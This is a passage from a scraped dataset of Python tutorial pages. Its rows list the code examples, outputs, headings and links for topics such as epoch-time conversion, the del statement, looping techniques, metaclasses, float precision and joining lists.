'datetime_str = datetime_obj.strftime( ""%Y - %m - %d  %H : %M : %S"" )', '# printing the values', 'print( ""Unix epoch time:"", epoch_time )', 'print( ""DateTime:"", datetime_str )', '# importing the datetime module', 'from datetime import datetime', '# using the strptime() function', ""dt_obj = datetime.strptime( '10-6-2021 10:33:35,72', '%d-%m-%Y %H:%M:%S,%f')"", 'epoch_msec = dt_obj.timestamp() * 1000', 'print(""epoch time in milliseconds:"", epoch_msec)', '# importing the datetime module', 'import datetime', '# given epoch timestamp', 'epoch_time = 33456871', '# using the datetime.fromtimestamp() function', 'the_datetime = datetime.datetime.fromtimestamp( epoch_time )', '# printing the values', 'print( ""epoch timestamp:"", epoch_time )', 'print( ""DateTime:"", the_datetime )', '# importing the datetime module', 'import datetime', '# using the timestamp() function', 'epoch_time = datetime.datetime(1960, 6, 10, 0, 0).timestamp()', '# printing the values', 'print( epoch_time )']","['Given epoch time: 40246871', 'Converted Datetime: 1971-04-12 01:11:11', 'Converted epoch time: 1623184200.0', 'Given epoch time: 700024', 'Converted datetime string: 1970 - 01 - 09  07 : 57 : 04', 'Given epoch time: 402471.238201', 'Converted Datetime: 1970-01-05 21:17:51.238201', 'DateTime Time zone: 2021-06-10 09:34:32-05:00', 'Unix epoch time: 252384207', 'DateTime: 1977 - 12 - 31  08 : 13 : 27', 'epoch time in milliseconds: 1623301415720.0', 'epoch timestamp: 33456871', 'DateTime: 1971-01-23 11:04:31', 'Traceback (most recent call last):', 'File ""D:\\Python\\epochpython.py"", line 5, in', 'epoch_time = datetime.datetime(1960, 6, 10, 0, 0).timestamp()', 'OSError: [Errno 22] Invalid argument']",[],['|||Converting DateTime into epoch time|||Converting epoch into DateTime string|||Converting epoch into DateTime milliseconds|||Converting epoch into DateTime timezone|||Converting Unix epoch into DateTime|||Converting DateTime into epoch time in milliseconds|||Converting epoch timestamp to DateTime|||Python epoch DateTime year is out of range||||||%Y designates the year|||%m designates the month|||%d designates the day|||%H designates an hour|||%M designates the minute|||%S designates seconds|||']
219,['Python del Statement'],"['In Python, the del keyword is generally used to delete an object. Since everything in Python represents some kind of object, the del keyword can also be used to delete lists, variables, parts of a list, etc. The del statement does not return any type of value.']","['https://www.javatpoint.com/looping-technique-in-python', 'https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/looping-technique-in-python', 'https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/looping-technique-in-python']","['https://static.javatpoint.com/python/images/python-del-statement.png', 'https://static.javatpoint.com/python/images/python-del-statement2.png', 'https://static.javatpoint.com/python/images/python-del-statement3.png', 'https://static.javatpoint.com/python/images/python-del-statement4.png']",[],"['Introduction', 'Syntax of del statement', 'Examples of del Statement']",[],"['Note: del is a keyword, and obj_name can be lists, dictionaries, user-defined objects, variables, etc.']","[""Let's look at some examples of del statements and try to delete some items."", 'Example 1: In this program we will delete a variable using del statement', 'Example 2: In this program we will delete a list and slice list using del keyword', 'Example 3: In this program, we will use the del statement to delete dictionaries and key-value pairs', 'Example 4: Delete a User-Defined Object']",[],[],"['del obj_name', 'c = a + b + 13 - 1 + 5', 'print(c)', '# delete the c variables', '# print c variable after delete', 'print(c)', 'items_1 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]', 'items_2 =[""a"", ""b"", ""c"", ""d"", ""e"", ""f""]', '# print the items_1 and items_2', 'print(items_1)', 'print(items_2)', '# delete the 3rd element of items_1', 'del items_1[2]', '# check if the 3rd element in items_1 is deleted or not', 'print(items_1)', '# slice items_1 from index 4 to 9', 'del items_1[4:9]', '# check if the elements from index 4 to 9 in items_1 is deleted or not', 'print(items_1)', '# delete the 2nd element of items_2', 'del items_2[1]', '# check if the 2nd element in items_2 is deleted or not', 'print(items_2)', '# delete items_2', 'del items_2', '# check if items_2 exists', 'print(items_2)', 'dictionary_1 = {""up"": ""down"", ""forward"": ""backward"", ""small"": ""down""}', 'dictionary_2 = {""short"": ""long"", ""you"": ""me"", ""Jack"": ""John""}', '# check if dictionary_1 and dictionary_2 exists', 'print(dictionary_1)', 'print(dictionary_2)', '# delete key-value pair with key ""up"" from dictionary_1', 'del dictionary_1[""up""]', '# check if the key-value pair with key ""up"" from dictionary_1 is deleted', 'print(dictionary_1)', '# delete dictionary_2', 'del dictionary_2', '# check if dictionary_2 exists', 'print(dictionary_2)', '# defining a class', 'class employee:', 'name = ""John wik""', 'age = 26', 'address = ""C-26, London""', 'phone_no = 61562347', '# declaring the object to the employee class', 'emp = employee()', '# print the employee data', 'print(""Name: "", emp.name)', 'print(""Age: "", emp.age)', 'print(""Address: "", emp.address)', 'print(""Phone No: "", emp.phone_no)', '# deleting the object', 'del emp', '# printing values - will generate NameError', 'print(""Name: "", emp.name)', 'print(""Age: "", emp.age)', 'print(""Address: "", emp.address)', 'print(""Phone No: "", emp.phone_no)']","['35', 'Traceback (most recent call last):', 'File """", line 10, in', ""NameError: name 'c' is not defined"", '>', '[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]', ""['a', 'b', 'c', 'd', 'e', 'f']"", '[0, 1, 3, 4, 5, 6, 7, 8, 9]', '[0, 1, 3, 4]', ""['a', 'c', 'd', 'e', 'f']"", 'Traceback (most recent call last):', 'File """", line 30, in', ""NameError: name 'items_2' is not defined"", '>', ""{'up': 'down', 'forward': 'backward', 'small': 'down'}"", ""{'short': 'long', 'you': 'me', 'Jack': 'John'}"", ""{'forward': 'backward', 'small': 'down'}"", 'Traceback (most recent call last):', 'File """", line 18, in', ""NameError: name 'dictionary_2' is not defined"", '>', 'Name:  John wik', 'Age:  26', 'Address:  C-26, London', 'Phone No:  61562347', 'Traceback (most recent call last):', 'File """", line 21, in', ""NameError: name 'emp' is not defined"", '>']",[],[]
220,['Looping technique in Python'],"['Python has specific inbuilt functions, due to which it supports numerous looping techniques in several sequential containers. These looping functions and methods are very useful for competitive coding. It can be used in different projects in which user has to use some specific technique with loops for maintaining the whole structure of the program. These techniques help save time and memory space as the user does not have to declare the extra variables for the traditional approach of loops.']","['https://www.javatpoint.com/metaprogramming-with-metaclasses-in-python', 'https://www.javatpoint.com/python-del-statement', 'https://www.javatpoint.com/metaprogramming-with-metaclasses-in-python', 'https://www.javatpoint.com/python-del-statement', 'https://www.javatpoint.com/metaprogramming-with-metaclasses-in-python']",[],[],"['Looping Techniques by using Python Data Structures:', 'Conclusion']",['Where these looping techniques are used?'],[],"['Example 1:', 'Example 2:', 'Example 1:', 'Example 2:', 'In this tutorial, we have discussed the different types of lopping techniques that are useful for saving memories and time.']",[],"['Different types of looping techniques are used in the places where the user does not have to manipulate the structure of the code or the orders of the whole containers. Instead, the user has to print the elements for a single-use instance, and no in-place change occurs in the container. These can also be used for saving time and memory.']","[""for key, value in enumerate(['Joe', 'waited', 'for', 'the', 'train', ',', 'but', 'the', 'train', 'was', 'late', '.']):"", 'print(key, value)', '# first, we will initialize the list', ""question = ['animal', 'shape', 'time']"", ""answer = ['tiger', 'square', '11 o clock']"", '# the zip() function will be used for combining these two containers', 'for question, answer in zip(question, answer):', ""print('What is this {0}?  this is {1}.'.format(question, answer))"", 'dict = { ""Joe"" : ""waited"", ""for"" : ""the"", ""train"" : ""but"", ""the"" : ""train"", ""was"" : ""late"" }', '# the use items for print the dictionary key-value pair', 'print (""The key value pair by using items is : "")', 'for a, b in dict.items():', 'print(a, b)', '# first, initialize the list', 'list = [ 1 , 4, 6, 7, 1, 2, 4 ]', '# using sorted() to print the list in sorted order', 'print (""The list in sorted order is : "")', 'for a in sorted(list) :', 'print (a, end = "" "")', 'print (""\\r"")', '# now use the sorted() function and set() function for printing the list in sorted order', '# use of set() to removes duplicates in output value.', 'print (""The list in sorted order (without duplicates) is : "")', 'for a in sorted(set(list)) :', 'print (a, end = "" "")', '# initializing list', ""list2 = ['Joe', 'waited', 'for', 'the', 'train', 'but', 'the', 'train', 'was', 'late']"", '# now use the sorted() function and set() function for printing the list in sorted order', 'for sentence in sorted(set(list2)):', 'print(sentence)', '# initializing list', 'list = [ 1 , 3, 5, 7, 9, 11, 13, 15, 17, 19, 21 ]', '# by using the revered() function for printing the list in reversed order', 'print (""The list in reversed order is : "")', 'for a in reversed(list) :', 'print (a, end = "" "")', 'for b in reversed(range(1, 20, 2)):', 'print (b)']","['0 Joe', '1 waited', '2 for', '3 the', '4 train', '5 ,', '6 but', '7 the', '8 train', '9 was', '10 late', '11 .', 'What is this animal?  this is tiger.', 'What is this shape?  this is square.', 'What is this time?  this is 11 o clock.', 'The key value pair by using items is :', 'Joe waited', 'for the', 'train but', 'the train', 'was late', 'The list in sorted order is :', '1 1 2 4 4 6 7', 'The list in sorted order (without duplicates) is :', '1 2 4 6 7', 'Joe', 'but', 'for', 'late', 'the', 'train', 'waited', 'was', 'The list in reversed order is :', '21 19 17 15 13 11 9 7 5 3 1', '19', '17', '15', '13', '11', '9', '7', '5', '3', '1']",[],"['|||enumerate(): The enumerate() function is used for looping through the containers and for printing the index number with the value present in that specific index.||||||zip(): The zip() function is used for combining the two similar containers, such as dict with dict or list with the list, by printing their values in sequence. The loop will exist only after the end of the smaller container.||||||items(): The items() function is used for looping through the dictionary and printing the key and its values in sequence.||||||sorted(): The sorted() function is used for printing the container in sorted order. This function does not sort the container, but it is used for printing the container in sorted order, for instance. The user can use the set() function with the sorted() function to remove the duplicate value in the output.||||||reversed(): The reserved() function is used for printing the values of the container in the reversed order.|||']"
221,['Metaprogramming with Metaclasses in Python'],"['Metaprogramming might sound new, but if the user has ever worked with Decorators or metaclasses, they have used metaprogramming in their projects. Therefore, we can say that metaprogramming is the program that is used for manipulating the program.']","['https://www.javatpoint.com/precision-handling-in-python', 'https://www.javatpoint.com/looping-technique-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/precision-handling-in-python', 'https://www.javatpoint.com/looping-technique-in-python', 'https://www.javatpoint.com/precision-handling-in-python']",['https://static.javatpoint.com/python/images/metaprogramming-with-metaclasses-in-python.png'],[],"['When the user should use Metaclass', 'Conclusion']","['Metaclasses', 'How to Create Customized Metaclass', 'How to Solve the Problem with Metaclass']",[],"['Explanation -', 'We can summarize the whole metaclass as:', 'Metaclass is used for creating Classes, and these classes can create the objects.', 'For creating the customized metaclass, the user customized metaclass has to inherit type metaclass and usually override, such as:', 'The users can create the classes by using the type() method directly. The type() method can be called in the following ways:', 'Explanation -', 'We will create the class normally and then immediately we will wrap up by using the debug method decorator:']","['In Python, every module or function is associated with some type. For example, if a user has a variable that has the integer value, then it is associated with an ""int"" type. The user can know the type of anything by using the type() method.', 'As the classes are also an object, we can modify them. For example, the user can add or subtract fields or functions in the class as we do with other objects.', 'There are some issues that can be resolved by using metaclass or non-metaclass, but there are some cases in which the only metaclass is used for resolving them.', ""Users don't use metaclass most often, as metaclasses are mainly used for complicated situations. But there are few cases where the users can use the metaclass:"", 'In this tutorial, we have discussed metaclasses, how to customize the metaclass, and how users can use them to solve problems and complicated programming and their alternatives.']","['In this tutorial, we will discuss the metaclasses and their uses and what their alternatives are. As this is an advanced topic of Python, the users are advised to revise the basic concepts of ""Decorators in Python"" and ""OOPS concepts in Python"" before starting this tutorial.', ""Every type in Python is defined by class. Therefore, in the above example, they are the object of 'int,' 'list' or 'str' class type, unlike C language or Java language in which int, char, and float are the primary data types. The users can create the new type by creating the class of that type. For example, we can create a new type of Object by City class."", 'The class in Python is also an object, and therefore, like other objects, it is an instance of Metaclass. The metaclass is a special class type which is responsible for creating classes and Class object. So, for example, if the user wants to find the type of the ""City"" class, they will find out that it is ""type.""', 'The metaclass is responsible for creating the classes so the user can write their customized metaclasses by inserting code or extra actions for modifying the way classes are created. Usually, the user does not need the customized metaclass, but in exceptional cases, it is necessary.', ""Now, let's see how to create a metaclass without using the type() function directly. For example, we will create the metaclass called MultiBases, which will check if the class being created has inherited from more than one base class. If so, it will raise an error."", 'There are some problems that users can solve by using metaclass and decorators. But there are some problems whose solution can be found only by using metaclass. Such as, the user wants to debug the class function, what they want is that whenever the class function is executed, it will print their full qualified name before executing their body.', 'The above solution is working fine, but there is one problem, which is the user wants to apply the decorator method to all the subclasses which have inherited the ""Calculator"" class. So in that scenario, the user has to apply the decorator method separately to each subclass, just like we did in the above example for the Calculator class.', 'Now, the actual problem is there can be loads of subclasses of the class, and applying the decorator method individually to each subclass is challenging and a time consuming process. So, to resolve this problem, the user must make sure that each subclass has this debug property, they should look for the metaclass based solution.']","['number = 13', 'print(""Type of number is:"", type(num))', 'list = [3, 7, 8]', 'print(""Type of list is:"", type(list))', 'name = ""Mark Jackson""', 'print(""Type of name is:"", type(name))', 'class City:', 'pass', 'City_object = City()', '# now, we will print the type of object of City class', 'print(""Type of City_object is:"", type(City_object))', 'class City:', 'pass', '# now, we will print the type of the City class', 'print(""Type of City class is:"", type(City))', '# First, we will define the class without any using any class methods or variables.', 'class City:', 'pass', '# now, we will define the method variables', 'City.a = 65', '# we will now, define the class methods', ""City.foo = lambda self: print('Pune')"", '# then, we will create the object', 'userobject = City()', 'print(userobject.a)', 'userobject.foo()', 'def City_method(self):', 'print(""This is City class method!"")', '# we will create the base class', 'class Base:', 'def userfunction(self):', 'print(""This is a inherited method!"")', '# we will create the city class dynamically by using', '# type() function.', 'City = type(\'City\', (Base, ), dict(a = ""Mark Jackson"", user_method = City_method))', '# now, we will print the type of City', 'print(""The Type of City class: "", type(City))', '# we will create the instance of City class', 'City_object = City()', 'print("" The Type of City_object: "", type(City_object))', '# we will now call the inherited method', 'City_object.userfunction()', '# we will call the City class method', 'City_object.user_method()', '# at last we will print the variable', 'print(City_object.a)', '# Inside the metaclass', 'class MultiBases(type):', '# we will override the __new__() function', 'def __new__(city, city_name, bases, citydict):', '# if the number of base classes are greator than 1', '# it will raise an error', 'if len(bases)>1:', 'raise TypeError(""There are inherited multiple base classes!!!"")', '', '# else it will execute the __new__() function of super class, that is', '# it will call the __init__() function of type class', 'return super().__new__(city, city_name, bases, citydict)', ""# the metaclass can be specified by using 'metaclass' keyword argument"", '# now we will use the MultiBase class for creating classes', '# this will be propagated to all subclasses of Base', 'class Base(metaclass = MultiBases):', 'pass', '# this will raise no error', 'class P(Base):', 'pass', '# this will raise no error', 'class Q(Base):', 'pass', '# this will raise no error', 'class R(Base):', 'pass', '# This will raise an error!', 'class S(P, Q, R):', 'pass', 'from functools import wraps', 'def debugg(funct):', ""'''decorator for debugging passed function'''"", '@wraps(funct)', 'def wrapperr(*args, **kwargs):', 'print(""The full name of this Function:"", funct.__qualname__)', 'return funct(*args, **kwargs)', 'return wrapperr', 'def debug_methods(clas):', ""'''class decorator make use of debug decorator"", ""for debuging the class functions '''"", '# now we will check in the class dictionary for any callable(function)', '# if there is any, replace it with debugged version', 'for key, value in vars(clas).items():', 'if callable(value):', 'setattr(clas, key, debugg(value))', 'return clas', '# sample class', '@debugmethods', 'class Calculator:', 'def add(self, p, q):', 'return p+q', 'def mul(self, p, q):', 'return p*q', 'def div(self, p, q):', 'return p/q', 'user_cal = Calculator()', 'print(user_cal.add(5, 8))', 'print(user_cal.mul(6, 7))', 'print(user_cal.div(21, 7))', 'from functools import wraps', 'def debugg(funct):', ""'''decorator for debugging passed function'''"", '@wraps(funct)', 'def wrapperr(*args, **kwargs):', 'print(""The full name of this Function:"", funct.__qualname__)', 'return funct(*args, **kwargs)', 'return wrapperr', 'def debug_methods(clas):', ""'''class decorator will make use of the debug decorator"", ""to the debug class '''"", 'for key, value in vars(clas).items():', 'if callable(value):', 'setattr(clas, key, debugg(value))', 'return clas', 'class debug_Meta(type):', ""'''meta class which feed created class object"", 'to debug_method for getting debug functionality', ""enabled objects'''"", 'def __new__(clas, clasname, bases, clasdict):', 'object = super().__new__(clas, clasname, bases, clasdict)', 'object = debug_methods(object)', 'return object', ""# the base class with metaclass 'debug_Meta'"", '# now all the subclass of this will have the applied debugging function', 'class Base(metaclass = debug_Meta):pass', '# now, we will inherite the Base', 'class Calculator(Base):', 'def add(self, p, q):', 'return p+q', '#and then, we will inherite the Calculator', 'class Calculator_adv(Calculator):', 'def mult(self, p, q):', 'return p*q', '# Now Calculator_adv object will show', '# the behaviour og debugging', 'user_cal = Calculator_adv()', 'print(user_cal.add(3, 7))', 'user_cal = Calculator_adv()', 'print(user_cal.mult(3, 7))']","[""Type of number is: <class 'int'>"", ""Type of list is: <class 'list'>"", ""Type of name is: <class 'str'>"", ""Type of City_object is: <class '__main__.City'>"", ""Type of City class is: <class 'type'>"", '65', 'Pune', ""The Type of City class:  <class 'type'>"", ""The Type of City_object:  <class '__main__.City'>"", 'This is a inherited method!', 'This is City class method!', 'Mark Jackson', '---------------------------------------------------------------------------', 'TypeError                                 Traceback (most recent call last)', '<ipython-input-2-409c90c285d5> in <module>', '29     pass', '30 # This will raise an error!', '---> 31 class S(P, Q, R):', '32     pass', '<ipython-input-2-409c90c285d5> in __new__(city, city_name, bases, citydict)', '6         # it will raise an error', '7         if len(bases)>1:', '----> 8             raise TypeError(""There are inherited multiple base classes!!!"")', '9', '10         # else it will execute the __new__() function of super class, that is', 'TypeError: There are inherited multiple base classes!!!', 'The full name of this method: Calculator.add', '13', 'The full name of this method: Calculator.mul', '42', 'The full name of this method: Calculator.div', '3.0', 'The full name of this Function: Calculator.add', '10', 'The full name of this Function: Calculator_adv.mult', '21']",[],"['|||__new__(): The __new__() function is classes before __int__() function. this is used for creating the object and return it. The user can override this function for controlling how the objects are created. |||__int__(): The __int__() function is used for initializing the created object which is passed as the parameter.||||||Name of class|||Pass the tuple which has base classes inherited by class|||Class dictionary: This will be served as the local namespace for class, which is populated with functions and variables.||||||As shown in the above example, Metaclass is used for generating down the inheritance hierarchies. This will affect all the subclasses also. If the user has such situations, then they can use the metaclass.|||If the user wants to change the class automatically, they can use a metaclass when it is created.|||If the user is an application programming interface developer, they can use metaclasses for that purpose. |||&&&|||As shown in the previous example, the user can call it with one argument, and it will return the type.|||The user can call it in three parameters. It will create the class. The following arguments are passed in it:||||||Name of class|||Pass the tuple which has base classes inherited by class|||Class dictionary: This will be served as the local namespace for class, which is populated with functions and variables.||||||']"
222,['Precision Handling in Python'],"['Python provides many built-in methods to handle the precision of floating points. In this tutorial, we will discuss the most common types of methods to set precision in Python. Most of the methods are defined under the math module.']","['https://www.javatpoint.com/sentiment-analysis-in-python', 'https://www.javatpoint.com/metaprogramming-with-metaclasses-in-python', 'https://www.javatpoint.com/sentiment-analysis-in-python', 'https://www.javatpoint.com/metaprogramming-with-metaclasses-in-python', 'https://www.javatpoint.com/sentiment-analysis-in-python']",[],[],"['Various Methods to handle Precision', 'Manipulate Decimal Part']",['Conclusion'],[],"['The following methods come with the math module.', ""Let's understand the following example."", 'Example - ', 'We have discussed the six methods to handle Precision in Python. All the methods are easy to use and return an accurate result.']","[""In the previous example, we have seen how we can remove the fractional part of a number. Now we will learn how to manipulate the decimal part. First, let's understand the following methods.""]",[],"['import math', 'num = 25.74356801', '# using trunc() function', 'print(""The value is:"",math.trunc(num))', '# using ceil() function', 'print (""The ceiling value is:"",math.ceil(num))', '# using floor() function', 'print (""The floor value is:"", math.floor(num))', 'num = 25.73796211', '# using ""%"" operator', ""print ('The value is: %.3f'%num)"", '# using format() function', 'print (""The value is: {0:.3f}"".format(num))', '# using round() function', 'print (""The value is:"",round(num,5))']","['The value is: 25', 'The ceiling value is: 26', 'The floor value is: 25', 'The value is: 25.738', 'The value is: 25.738', 'The value is: 25.73796']",[],"['|||trunc() - The trunc() method removes all the decimal points from the floating number. It returns the integer value without the decimal part.|||ceil() - This method prints the least integer greater than the given number.|||floor() - This method prints the greatest integer smaller than the integer.||||||The % operator - It works as a printf in C and is used to set precision and format. We can customize the limits of precision points to be included in the resultant number.|||format() - It is a built-in method of Python, which is used to format the string and set precision.|||round(n,d) - It is used to round off the number n up to d decimal places. We can select the number of digits that can be displayed after the decimal points.|||']"
223,['Python Join List'],"[""In this topic, we will discuss how we can join two or more lists with different functions of Python. Before going through the concepts, let's take a brief introduction to the Python List. A Python List is the collection of multiples items that are grouped in the same name. It can store different data types (integer, string, float, etc.) items inside a square bracket [], which is separated by a (,) comma.""]","['https://www.javatpoint.com/strip-function-in-python', 'https://www.javatpoint.com/sentiment-analysis-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/strip-function-in-python', 'https://www.javatpoint.com/sentiment-analysis-in-python', 'https://www.javatpoint.com/strip-function-in-python']",['https://static.javatpoint.com/python/images/python-join-list.png'],[],[],"['Program to print the Python list', 'Join lists in Python using the join() function', 'Program to join two lists using the join() function and delimiter', 'Program to join a list without using delimiter', 'Join two integers list using map() function', 'Program to use a map() function and join() function in list', 'Program to join two lists in Python using for loop and append() function', 'Program to join multiple lists using itertools.chain() method', 'Program to join two lists using + operator', 'Program to join two list using (*) multiply operator', 'Program to join two lists in Python using extend() method']","['Note: If the iterable list contains any non-string values or items, it throws a TypeError exception.']","['When we join two or more lists together in a Python program, it gives a joined lists. And this process is called composition or joining of lists.', ""Let's discuss the different ways to join two or more lists in Python:"", 'A join() function is used to join an iterable list to another list, separated by specified delimiters such as comma, symbols, a hyphen, etc.', 'str_name: It is the name of the delimiter that separates an iterable list.', 'iterable: It is the list that contains a set of elements and joins with a delimiter.', 'Return Value: It returns a concatenated list that is separated by specified delimiters.', ""Let's create a program to convert the given integers list into a string using the map() function and then join() function to join the list."", 'Convert.py', ""Let's create a simple program in Python to concatenate multiple lists using the chain() method by importing the itertools package."", ""Let's consider an example to join two lists in Python using the (+) plus operator."", 'Consider an example to join two lists of in Python using * operator.', ""Let's write a simple program to join two lists using extend() method in Python.""]","['In the above syntax, a map() function has two parameters, list_name, and str. Where list_name is the name of integers list and str represents the string. A map() function converts the list_name into the string (str).', ""An append() function is used to sequentially add or join each element of an iterable list at the end of another list using for loop. Let's create a simple program to add elements of a list at the end of another list using the append() function.""]","['Integer list: It collects all integers in a list called the integer list, and we cannot join two integer lists in Python using the join() function. Therefore, we use a map() function that converts an integer list into a string. After that, we use a join() function to join map() function results with appropriate delimiters.']","['# list of characters', ""List1 = ['A', 'B', 'C', 'D', 'E']"", '# list of integers', 'List2 = [1, 2, 3, 4, 5,]', '# mixed lists', ""List3 = ['A', 1, 'C', 'E', 5, 8]"", 'print ("" Display the List1 "", List1)', 'print ("" Display the List2 "", List2)', 'print ("" Display the List3 "", List3)', 'str_name.join( iterable)', 'List1 = [ ""Apple"", ""Orange"", ""Banana"", ""Mango"", ""Grapes"" ]', 'Str2 = "", "" # It is the comma delimiter', '# use join() function to join List1 with the "" . "" delimiter', 'Str2 = Str2.join( List1)', '# print the join list', 'print ("" Display the concatenated List1 using join() function and delimiter"", Str2)', 'List2 = [  ""Sunday"", ""Monday"", ""Tuesday"", ""Wednesday"", ""Thursday"" ]', 'Str3 = "" - "" # It is the hyphen delimiter', '# use join() function to join List2 with the "" - "" delimiters', 'Str3 = Str3.join( List2)', '# print the join list', 'print ("" Display the concatenated List2 using join() function and delimiter"", Str3)', '# declare a python list', ""Lt1 = [ 'j', 'a', 'v', 'a', 't', 'p', 'o', 'i', 'n', 't' ]"", 'print ( "" Display the elements of the List L1 "" , Lt1)', ""L2 = '  '  # declare any empty string without defining any delimiter"", 'Ret = L2.join( Lt1) # use join method to join L1 list with L2', 'print ( "" Display the List without using delimiters"", Ret)', 'map(str, list_name)', 'lt = [1, 2, 3, 4, 5]', '# use map() function to convert integer list into string', 'list_map = map(str, lt)', ""lt2 = ', '"", '# use join() function to join lists and delimiter comma (,)', 'res = lt2.join (list_map)', 'print ("" Display the concatenated integers list using map() and join() function "", res)', 'List1 = [1, 2, 3, 4, 5] # declare List1', 'List2 = [5, 6, 7, 8, 9, 10] # declare List2', 'print ("" Given List1 "", List1)', 'print ("" Given List2 "", List2)', '# use for loop to iterate each element of Lt1 to l2', 'for i in List2:', 'List1.append(i) # use append() function to insert each elements at the end of Lt1', 'print ("" Display concatenation list using append() function "", List1)', '# use Python itertools.chain() method to join two list', 'import itertools', '# declare different lists', 'a = [1, 2, 3, 4, 5]', 'b = [6, 7, 8, 9, 10]', 'c = [11, 12, 13, 14, 15]', 'print ("" Display the first list "", a)', 'print ("" Display the second list "", b)', 'print ("" Display the third list "", c)', '# use itertools.chain() method to join the list', 'result = list (itertools.chain (a, b, c))', '# pass the result variable in str() function to return the concatenated lists', 'print ("" Concatenated list in python using itertools.chain() method "", str (result))', ""# Create a program to join two lists in Python using the '+' operator"", '# declare two lists of characters', ""list1 = [ 'A', 'B', 'C', 'D', 'E']"", ""list2 = [ 'F', 'G', 'H', 'I', 'J']"", ""# join two characters lists using '+' operator"", 'lt_sum1 = list1 + list2', '# declares two lists of integers', ""list3 = [ '1', '2', '3', '4', '5']"", ""list4 = [ '6', '7', '8', '9', '10']"", ""# join two integers lists using '+' operator"", 'lt_sum2 = list3 + list4', '# display the concatenation list', 'print ("" Join two list of characters in Python using + operator: "", str(lt_sum1))', '# display the concatenation list', 'print ("" Join two list of integers in Python using + operator: "", str(lt_sum2))', '# declare two lists of characters', ""List1 = [ 'A', 'B', 'C', 'D', 'E']"", ""List2 = [ 'F', 'G', 'H', 'I', 'J']"", 'print ("" Display character List1 "", List1)', 'print ("" Display character List2 "", List2)', ""# join two characters lists using '*' operator"", 'lt_sum1 = [*List1, *List2]', '# declares two lists of integers', 'List3 = [ 1, 2, 3, 4, 5]', 'List4 = [ 6, 7, 8, 9, 10]', 'print ("" Display integer List3 "", List3)', 'print ("" Display integer List4 "", List4)', ""# join two integers lists using '*' operator"", 'lt_sum2 = [*List3, *List4]', '# display the concatenation list', 'print ("" Join two characters list in Python using * operator: ""+ str(lt_sum1))', '# display the concatenation list', 'print ("" Join two integers list in Python using * operator: ""+ str(lt_sum2))', '# takes two integers lists', 'List1 = [5, 10, 5]', 'List2 = [ 2, 4, 6, 8]', 'print ("" Display the List1 "", List1)', 'print ("" Display the List1 "", List2)', '# takes two string lists', ""List3 = [ 'RED', 'BLUE', 'BLACK']"", ""List4 = [ 'BROWN', 'PURPLE', 'GREY' ]"", 'print ("" Display the List3 "", List3)', 'print ("" Display the List4 "", List4)', '# use extend() method to join two lists', 'List1.extend(List2)', 'List3.extend(List4)', '# print concatenation lists', 'print( ""\\n Adding two lists of integers in Python using the extend() function: "", str(List1))', 'print( ""\\n Adding two lists of strings in Python using the extend() function: "", str(List3))']","[""Display the List1  ['A', 'B', 'C', 'D', 'E']"", 'Display the List2  [1, 2, 3, 4, 5]', ""Display the List3  ['A', 1, 'C', 'E', 5, 8]"", 'Display the concatenated List1 using join() function and delimiter Apple, Orange, Banana, Mango, Grapes', 'Display the concatenated List2 using join() function and delimiter Sunday - Monday - Tuesday - Wednesday - Thursday', ""Display the elements of the List L1  ['j', 'a', 'v', 'a', 't', 'p', 'o', 'i', 'n', 't']"", 'Display the List without using delimiters j  a  v  a  t  p  o  i  n  t', 'Display the concatenated integers list using map() and join() function  1, 2, 3, 4, 5', 'Given List1  [1, 2, 3, 4, 5]', 'Given List2  [5, 6, 7, 8, 9, 10]', 'Display concatenation list using append() function  [1, 2, 3, 4, 5, 5, 6, 7, 8, 9, 10]', 'Display the first list  [1, 2, 3, 4, 5]', 'Display the second list  [6, 7, 8, 9, 10]', 'Display the third list  [11, 12, 13, 14, 15]', 'Concatenated list in python using itertools.chain() method  [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]', ""Join two list of characters in Python using + operator:  ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J']"", ""Join two list of integers in Python using + operator:  ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']"", 'Display integer List3  [1, 2, 3, 4, 5]', 'Display integer List4  [6, 7, 8, 9, 10]', ""Join two characters list in Python using * operator: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J']"", 'Join two integers list in Python using * operator: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]', 'Display the List1  [5, 10, 5]', 'Display the List1  [2, 4, 6, 8]', ""Display the List3  ['RED', 'BLUE', 'BLACK']"", ""Display the List4  ['BROWN', 'PURPLE', 'GREY']"", 'Adding two lists of integers in Python using the extend() function:  [5, 10, 5, 2, 4, 6, 8]', ""Adding two lists of strings in Python using the extend() function:  ['RED', 'BLUE', 'BLACK', 'BROWN', 'PURPLE', 'GREY']""]",[],['|||Join lists in Python using the join() function and delimiters|||Join a list in Python using the join() function without delimiters|||Join two integers list in Python using map() function|||Join two lists in Python using for loop and append() function|||Join multiple lists in Python using itertools.chain() method|||Join two lists in Python using (+) plus operator|||Join two lists in Python using (*) multiply or asterisk operator|||Join two lists in Python using extend() function|||']
224,['strip() function in Python'],"['The strip() function is a predefined library function of Python. It is used to return the copy of the original string by removing the leading and trailing whitespaces, characters, and symbols passed to the strip() function. In other words, it is the Python string strip() function which removes characters from both the left and right end of the string by specifying a set of characters to the strip() function as an argument. By default, it removes whitespaces from starting and ending string if no argument is passed to the strip() function.']","['https://www.javatpoint.com/gradient-descent-algorithm', 'https://www.javatpoint.com/python-join-list', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/gradient-descent-algorithm', 'https://www.javatpoint.com/python-join-list', 'https://www.javatpoint.com/gradient-descent-algorithm']",['https://static.javatpoint.com/python/images/strip-function-in-python.png'],[],[],"['Syntax', 'Parameter:', 'Use the strip() function to remove characters or symbols from a given string', 'Use the strip() function to remove whitespaces from a given string', 'Program to take any string from user and remove any characters or symbols using strip() function', 'Why is the Python strip() 